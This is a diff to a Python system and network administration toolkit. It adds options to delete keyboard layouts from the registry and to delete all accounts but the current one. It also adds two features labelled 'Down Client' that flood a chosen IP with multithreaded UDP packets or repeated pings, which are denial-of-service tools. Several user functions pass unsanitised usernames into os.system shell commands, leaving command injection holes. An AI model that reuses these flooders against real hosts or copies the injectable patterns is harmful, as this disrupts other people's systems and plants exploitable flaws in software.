@@ -3,6 +3,13 @@ import platform
 
 # Check if colorama package is installed
 try:
+        import pkg_resources
+        pkg_resources.require("pywin32")
+except ImportError:
+        print("pywin32 not found. Installing...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32"])
+
+try:
     import colorama
 except ImportError:
     # Install colorama package
@@ -58,13 +65,16 @@ import getpass
 import zipfile
 from colorama import Fore, Style
 import moviepy.editor as mp
-import subprocess
 import psutil
 import curses
-import subprocess
 import time
 import socket
 import sys
+import threading
+import subprocess
+import ctypes
+import win32api
+import winreg
 
 
 
@@ -352,6 +362,7 @@ def admin_tools():
     print(Fore.YELLOW +"1. Show System Users")
     print("2. Add user(s)")
     print("3. Remove user(s)")
+    print("4. Remove Keyboard(s)")
     print("0. Back")
 
     choice = input("Enter your choice: ")
@@ -363,20 +374,11 @@ def admin_tools():
         else:
             print("Unsupported operating system")
     elif choice == '2':
-        usernumber=input('Set Number of users need to Create: ')
-        if usernumber == '1':
-             if platform.system() == "Windows":
-                 username=input("Enter Username :")
-                 password=input("Enter Password :")
-                 add_user_windows(username, password)
-             elif platform.system() == "Linux":
-                 username=input("Enter Username :")
-                 password=input("Enter Password :")
-                 add_user_linux(username, password)
-             else:
-                print("Unsupported operating system")
-        else:
-            add_users(int(usernumber))
+         usernumber = input('Set Number of users need to Create: ')
+         if usernumber == '1':
+            add_single_user()
+         else:
+            add_multiple_users(usernumber)
     elif choice == '3':
             print(Fore.RED+"\nChoose Your Options:")
             print(Fore.YELLOW +"1. Delete Special User")
@@ -386,13 +388,65 @@ def admin_tools():
                 username=input("Enter Username To Delete: ")
                 delete_user(username)
             elif choice=='2':
-                delete_all_users_except_current()
+                deleted_users = delete_all_users_except_current()
+                print("Deleted users:", deleted_users)
             else:
                 print(Fore.RED+'Wrong Choice!!')
+    elif choice == '4':
+        layouts = list_keyboard_layouts()
+        print("List of keyboard layout IDs:")
+        for i, layout_id in enumerate(layouts):
+            print(f"{i+1}. {layout_id}")
+
+        current_layout = win32api.GetKeyboardLayout()
+        print(f"Current keyboard layout ID: {current_layout}")
+
+        choice = input("Enter the number of the layout you want to delete (0 to cancel): ")
+        if choice.isdigit():
+            choice = int(choice)
+            if 0 < choice <= len(layouts):
+                layout_id = layouts[choice - 1]
+                if layout_id == current_layout:
+                    print("Cannot delete the currently active keyboard layout.")
+                else:
+                    delete_keyboard_layout(layout_id)
+                    delete_layout_from_registry(layout_id)
+            elif choice == 0:
+                print("Operation canceled.")
+                admin_tools()
+            else:
+                print("Invalid choice.")
+        else:
+            print("Invalid input. Please enter a number.")
     elif choice == '0':
         main()
     else:
         print(Fore.RED+"Invalid choice...")
+def list_keyboard_layouts():
+    layouts = win32api.GetKeyboardLayoutList()
+    return layouts
+
+
+def delete_keyboard_layout(layout_id):
+    if layout_id < 0:
+        print("Cannot delete special keyboard layout.")
+        return
+    user32 = ctypes.windll.user32
+    user32.UnloadKeyboardLayout(layout_id)
+    print(f"Keyboard layout {layout_id} deleted successfully.")
+
+
+def delete_layout_from_registry(layout_id):
+    key_path = r"SYSTEM\CurrentControlSet\Control\Keyboard Layouts"
+    try:
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
+            winreg.DeleteKey(key, str(layout_id))
+            print(f"Keyboard layout '{layout_id}' deleted successfully from registry.")
+    except FileNotFoundError:
+        print(f"Keyboard layout '{layout_id}' not found in registry.")
+    except PermissionError:
+        print("Error: Permission denied. Please run the script with administrative privileges.")
+
 
 def Monitor_tools():
          Clear_Screen()
@@ -419,24 +473,46 @@ def Network_Tools():
     print(Fore.YELLOW +"1. Show Network Connection")
     print("2. Scan Open Ports")
     print("3. Network Scaner")
-    print("4. Show Network Connection info")
-    print("5. Send Magic Packet")
+    print("4. Send Magic Packet")
+    print("5. Down Client With UDP Packet")
+    print("6. Down Client With TCP Packet ")
     print("0. Back")
     choice=input("Enter Your Choice:")
     if choice=='1':
-        Network_connections()()
+        Network_connections()
     elif choice=='2':
         scan_open_ports()
     elif choice=='3':
         subnet, ip_range = get_user_input()
         scan_network(ip_range, subnet)
         print("\nScanning Complete!")
-    elif choice=='4':
-        Network_connections()
     elif choice=='5':
+            host = input("Enter the target IP address: ")
+            port = int(input("Enter the target port: "))
+            total_packets = int(input("Enter Number Of Packets:"))
+            num_threads = int(input("Enter Number Of Thread:"))
+            send_udp_packets_multithread(host, port, total_packets, num_threads)
+    elif choice=='4':
         mac_address, broadcast_address = get_user_input_magic_packet()
         send_magic_packet(mac_address, broadcast_address)
         print("Magic packet sent successfully!")
+    elif choice=='6':
+         ip_address, num_pings,num_thread = get_user_input_ping()
+
+         # Start ping processes in separate threads
+         threads = []
+         for _ in range(num_thread):  # You can change 100 to any desired number of threads
+             thread = threading.Thread(target=ping_target, args=(ip_address, num_pings))
+             thread.start()
+             threads.append(thread)
+
+         # Wait for user input to stop ping processes
+         input("Press Enter to stop pinging...")
+         stop_ping_threads()
+
+         # Join all threads to wait for them to complete
+         for thread in threads:
+             thread.join()
     elif choice=='0':
         main()
     else:
@@ -898,29 +974,56 @@ def show_system_users_linux():
             username = line.split(":")[0]
             print(username)
 
-def add_users(usernumber):
-    for i in range(usernumber):
-        # Generate random username and password
-        username = generate_random_username(8)
-        password = generate_random_password()
-        if platform.system() == "Windows":
-            add_user_windows(username, password)
-        elif platform.system() == "Linux":
-            add_user_linux(username, password)
-        else:
-            print("Unsupported operating system")
+def add_single_user():
+    if platform.system() == "Windows":
+        username = input("Enter Username: ")
+        password = input("Enter Password: ")
+        add_user_windows(username, password)
+    elif platform.system() == "Linux":
+        username = input("Enter Username: ")
+        password = input("Enter Password: ")
+        add_user_linux(username, password)
+    else:
+        print("Unsupported operating system")
+
+def add_multiple_users(usernumber):
+    try:
+        usernumber = int(usernumber)
+        if usernumber <= 0:
+            print("Invalid number of users.")
+            return
+        usernames = generate_random_username(usernumber)
+        for username in usernames:
+            password = generate_random_password()
+            if platform.system() == "Windows":
+                add_user_windows(username, password)
+            elif platform.system() == "Linux":
+                add_user_linux(username, password)
+            else:
+                print("Unsupported operating system")
+        print("Generated", usernumber, "unique usernames.")
+    except ValueError:
+        print("Invalid input. Please enter a valid number.")
+
+
+
 
 def add_user_windows(username, password):
-    os.system(f"net user {username} {password} /add")
+    subprocess.run(["net", "user", username, password, "/add", "/active:yes"], shell=True)
+
+
 
 def add_user_linux(username, password):
     os.system(f"sudo useradd -m {username} -p {password}")
 
+def generate_random_username(usernumber, username_length=8):
+    usernames = set()
+    usernumber = int(usernumber)  # Convert to integer
 
-def generate_random_username(length=8):
-    allowed_chars = string.ascii_letters + string.digits
-    username = ''.join(random.choice(allowed_chars) for _ in range(length))
-    return username
+    while len(usernames) < usernumber:
+        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=username_length))
+        usernames.add(username)
+    return list(usernames)
 
 def generate_random_password(length=12, complexity=3):
     lowercase_chars = string.ascii_lowercase
@@ -943,22 +1046,26 @@ def generate_random_password(length=12, complexity=3):
     return password
 
 def delete_user(username):
-
     if platform.system() == "Windows":
-        os.system(f"net user {username} /delete")
-        print(f"User '{username}' deleted successfully.")
+        command = f"net user {username} /delete"
     elif platform.system() == "Linux":
-        os.system(f"sudo userdel -r {username}")
-        print(f"User '{username}' deleted successfully.")
+        command = f"sudo userdel -r {username}"
     else:
         print("Unsupported operating system.")
+        return
+
+    print(f"Executing command: {command}")
+    try:
+        os.system(command)
+        print(f"User '{username}' deleted successfully.")
+    except Exception as e:
+        print(f"Error deleting user '{username}': {e}")
 
 
-def get_current_username():
-    return getpass.getuser()
+
+
 
 def get_user_list():
-  
     if platform.system() == "Windows":
         output = os.popen("net user").read()
         users = [line.split()[0] for line in output.splitlines()[4:] if line.strip()]
@@ -970,23 +1077,23 @@ def get_user_list():
         users = []
     return users
 
-def delete_user(username):
 
-    if platform.system() == "Windows":
-        os.system(f"net user {username} /delete")
-        print(f"User '{username}' deleted successfully.")
-    elif platform.system() == "Linux":
-        os.system(f"sudo userdel -r {username}")
-        print(f"User '{username}' deleted successfully.")
-    else:
-        print("Unsupported operating system.")
+        
+def get_current_username():
+    return getpass.getuser()
 
 def delete_all_users_except_current():
     current_user = get_current_username()
     users = get_user_list()
+    if users is None:
+        print("Error: Unable to retrieve user list.")
+        return
+    deleted_users = []
     for user in users:
         if user != current_user:
             delete_user(user)
+            deleted_users.append(user)
+    return deleted_users
 
 def display_processes():
     Clear_Screen()
@@ -1158,6 +1265,50 @@ def get_user_input_magic_packet():
     mac_address = input("Enter the MAC address of the target device (format: XX:XX:XX:XX:XX:XX): ")
     broadcast_address = input("Enter the broadcast address of the target network (e.g., 192.168.1.255): ")
     return mac_address, broadcast_address
+
+def send_udp_packet(host, port, num_packets_per_thread):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        for _ in range(num_packets_per_thread):
+            sock.sendto(b'ping', (host, port))
+        print(f"UDP packets sent to {host}:{port}")
+    except Exception as e:
+        print(f"Error: {e}")
+    finally:
+        sock.close()
+
+def send_udp_packets_multithread(host, port, total_packets, num_threads):
+    num_packets_per_thread = total_packets // num_threads
+    threads = []
+    for _ in range(num_threads):
+        thread = threading.Thread(target=send_udp_packet, args=(host, port, num_packets_per_thread))
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+        
+stop_threads = False
+
+def ping_target(ip, num_pings):
+    global stop_threads
+    if platform.system() == "Windows":
+        command = ["ping", "-n", str(num_pings), ip]
+    else:
+        command = ["ping", "-c", str(num_pings), ip]
+
+    while not stop_threads:
+        subprocess.run(command)
+
+def stop_ping_threads():
+    global stop_threads
+    stop_threads = True
+
+def get_user_input_ping():
+    ip_address = input("Enter the target IP address: ")
+    num_pings = int(input("Enter the number of pings: "))
+    num_thread = int(input("Enter the number of thread: "))
+    return ip_address, num_pings, num_thread
 
 
 def main():
